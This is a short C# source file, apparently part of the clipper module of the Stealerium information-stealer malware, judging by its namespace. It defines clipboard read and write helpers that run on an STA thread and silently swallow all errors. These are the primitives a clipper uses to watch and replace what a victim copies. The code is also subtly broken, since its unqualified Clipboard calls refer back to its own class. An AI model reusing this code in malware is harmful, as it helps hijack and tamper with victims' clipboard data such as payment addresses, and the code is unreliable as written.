using System.Threading;
using System.Windows.Forms;

namespace Stealerium.Clipper;

internal sealed class Clipboard
{
	public static string GetText()
	{
		string returnValue = string.Empty;
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				returnValue = Clipboard.GetText();
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}
		catch
		{
		}
		return returnValue;
	}

	public static void SetText(string text)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			try
			{
				Clipboard.SetText(text);
			}
			catch
			{
			}
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		thread.Join();
	}
}
